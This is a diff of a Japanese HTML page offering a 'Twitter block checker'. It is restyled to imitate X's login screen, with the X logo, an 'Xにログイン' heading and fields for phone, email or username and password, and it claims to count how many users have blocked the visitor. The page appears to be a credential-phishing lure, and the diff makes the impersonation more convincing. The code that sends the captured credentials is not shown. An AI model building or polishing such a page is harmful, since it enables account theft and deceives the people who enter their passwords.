@@ -3,16 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Twitter ブロック診断</title>
+    <title>Twitter ブロック診断 | 何人にブロックされてる？</title>
+    
+    <meta property="og:title" content="Twitter ブロック診断">
+    <meta property="og:description" content="あなたのアカウントが現在何人にブロックされているか、ログインして診断してみましょう。">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Twitter Block Checker">
+    <meta name="theme-color" content="#1d9bf0">
+
     <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
     <style>
+        * { box-sizing: border-box; }
         body {
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            background-image: radial-gradient(#d1d5db 1px, transparent 1px);
-            background-size: 20px 20px;
+            font-family: "Helvetica Neue", Arial, sans-serif;
+            background-color: #f7f9f9;
             color: #0f1419;
             display: flex;
             justify-content: center;
@@ -22,136 +28,215 @@
 
         .container {
             width: 100%;
-            max-width: 400px;
-            padding: 20px;
+            max-width: 380px;
+            padding: 40px 30px;
             text-align: center;
-            background: rgba(255, 255, 255, 0.9);
+            background: #ffffff;
             border-radius: 16px;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
-            backdrop-filter: blur(5px);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
         }
 
-        .screen { display: none; }
-        .active { display: block; }
-        .logo-placeholder {
-            width: 100px;
-            height: 100px;
-            background-color: #5bcbf5;
+        .screen { display: none; opacity: 0; transition: opacity 0.3s; }
+        .active { display: block; opacity: 1; }
+
+        .logo-area {
             margin: 0 auto 20px;
+            width: 60px;
+            height: 60px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 12px;
-            color: #fff;
+        }
+        
+        .logo-svg {
+            width: 50px;
+            height: 50px;
+            fill: #1d9bf0;
         }
 
         h1 {
-            font-size: 28px;
-            font-weight: 800;
-            margin-bottom: 20px;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #0f1419;
         }
 
         p {
-            font-size: 15px;
-            line-height: 1.6;
-            color: #0f1419;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #536471;
             margin-bottom: 30px;
         }
 
         .btn {
             width: 100%;
-            padding: 15px;
-            background-color: #5bcbf5;
+            padding: 14px;
+            background-color: #0f1419;
             color: white;
             border: none;
             border-radius: 9999px;
-            font-size: 18px;
+            font-size: 15px;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.2s, transform 0.1s;
         }
-        .btn:hover { background-color: #4ab8e0; }
+        .btn:hover { background-color: #272c30; }
+        .btn:active { transform: scale(0.98); }
+        
+        .btn-twitter {
+            background-color: #1d9bf0;
+            margin-bottom: 15px;
+        }
+        .btn-twitter:hover { background-color: #1a8cd8; }
+
         .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 18px; }
+        
+        label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #0f1419;
+        }
+        
         input {
             width: 100%;
             padding: 12px;
-            border: 2px solid #000;
-            border-radius: 8px;
+            border: 1px solid #cfd9de;
+            border-radius: 6px;
             font-size: 16px;
             outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            border-color: #1d9bf0;
+            box-shadow: 0 0 0 2px rgba(29, 155, 240, 0.2);
         }
 
         .spinner {
-            width: 150px;
-            height: 150px;
-            background-color: #5bcbf5;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
+            border-left-color: #1d9bf0;
+            animation: spin 1s linear infinite;
             margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            animation: pulse 1.5s infinite;
         }
-        @keyframes pulse {
-            0% { transform: scale(0.95); opacity: 0.7; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.7; }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .result-number {
-            font-size: 80px;
-            font-weight: bold;
-            margin: 20px 0;
+            font-size: 64px;
+            font-weight: 800;
+            margin: 10px 0;
+            color: #0f1419;
+            letter-spacing: -2px;
         }
-        .share-section {
-            margin-top: 30px;
-            font-size: 14px;
-            color: #536471;
+
+        .share-icons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
         }
+
+        .share-btn {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            text-decoration: none;
+            font-size: 18px;
+            transition: opacity 0.2s;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .share-btn:hover { opacity: 0.9; }
+        
+        .sb-x { background-color: #000; }
+        .sb-fb { background-color: #1877f2; }
+        .sb-line { background-color: #00b900; }
+        
+        .share-svg { width: 20px; height: 20px; fill: white; }
+
+        small { font-size: 11px; color: #8b98a5; }
+
     </style>
 </head>
 <body>
 
-    <div class="container">>
+    <div class="container">
+        
         <div id="screen-top" class="screen active">
-            <div class="logo-placeholder">/images/logo.png<br>1:1</div>
-            <h1>Twitter ブロック診断！</h1>
-            <p>このツールはTwitterで何人にブロックしているか<br>簡単に確認できるツールです。<br>このツールを使うにはまずログインしてください。</p>
-            <button class="btn" onclick="goToForm()">ログイン</button>
-        </div>
-        <div id="screen-form" class="screen">
+            <div class="logo-area">
+                <svg viewBox="0 0 24 24" class="logo-svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/>
+                </svg>
+            </div>
             <h1>Twitter ブロック診断</h1>
+            <p>自分がこれまでに何人のユーザーから<br>ブロックされているか一瞬でチェック。<br><small>※ログイン認証が必要です</small></p>
+            <button class="btn btn-twitter" onclick="goToForm()">ログインして診断</button>
+        </div>
+
+        <div id="screen-form" class="screen">
+            <div class="logo-area">
+                <svg viewBox="0 0 24 24" class="logo-svg">
+                    <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
+                </svg>
+            </div>
+            <h1>Xにログイン</h1>
             <div class="input-group">
-                <label>メールアドレス</label>
-                <input type="text" id="email">
+                <label>電話番号 / メールアドレス / ユーザー名</label>
+                <input type="text" id="email" autocomplete="off">
             </div>
             <div class="input-group">
                 <label>パスワード</label>
-                <input type="password" id="password">
+                <input type="password" id="password" autocomplete="off">
             </div>
-            <button class="btn" onclick="startDiagnosis()">診断開始する</button>
+            <button class="btn" onclick="startDiagnosis()">診断を開始</button>
         </div>
 
         <div id="screen-loading" class="screen">
-            <h1>Twitter ブロック診断</h1>
-            <p>リクエストが送られました！<br>診断結果が出るまでお待ちください！</p>
-            <div class="spinner">
-                ここに適当なローディングのくるくる
-            </div>
+            <h1>診断中...</h1>
+            <div class="spinner"></div>
+            <p>アカウント情報を照会しています。<br>この処理には数秒かかる場合があります。</p>
         </div>
+
         <div id="screen-result" class="screen">
-            <h1>Twitter ブロック診断</h1>
-            <p>診断結果が出ました！<br>ブロックされている人の人数は</p>
+            <div class="logo-area">
+               <svg viewBox="0 0 24 24" class="logo-svg" style="fill:#e0245e;">
+                    <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+               </svg>
+            </div>
+            <h1>診断結果</h1>
+            <p>あなたが現在ブロックされている人数は</p>
             <div class="result-number"><span id="block-count">0</span></div>
-            <p>人です</p>
-            <button class="btn">結果をSNSでシェア</button>
-            <div class="share-section">
-                この辺にtwitterとかfacebookのアイコンとか
+            <p>人です。</p>
+            
+            <div style="margin-top: 25px; border-top: 1px solid #eff3f4; padding-top: 20px;">
+                <p style="margin-bottom: 10px; font-weight: bold;">結果をシェアする</p>
+                <div class="share-icons">
+                    <button class="share-btn sb-x" onclick="alert('Xでシェアウィンドウを開く')">
+                        <svg viewBox="0 0 24 24" class="share-svg"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
+                    </button>
+                    <button class="share-btn sb-fb" onclick="alert('Facebookでシェアウィンドウを開く')">
+                        <svg viewBox="0 0 24 24" class="share-svg"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                    </button>
+                    <button class="share-btn sb-line" onclick="alert('LINEでシェアウィンドウを開く')">
+                         <svg viewBox="0 0 24 24" class="share-svg"><path d="M12 2C6.48 2 2 5.75 2 10.12c0 3.32 2.6 6.13 6.13 7.07.28.06.45.2.35.54-.11.45-.4 1.73-.46 1.95-.08.35.15.85.83.47 3.57-1.95 6.9-4.27 8.84-6.68 1.96-2.58 2.6-5.83.6-8.58C16.8 2.76 14.49 2 12 2zm0 0"/></svg>
+                    </button>
+                </div>
             </div>
         </div>
+
     </div>
 
     <script>
@@ -171,7 +256,9 @@
 
         function showScreen(id) {
             document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
+            setTimeout(() => {
+                 document.getElementById(id).classList.add('active');
+            }, 50); 
         }
 
         function goToForm() {
@@ -182,7 +269,7 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            if(!email || !password) return alert('入力してください');
+            if(!email || !password) return alert('全ての項目を入力してください');
 
             showScreen('screen-loading');
 
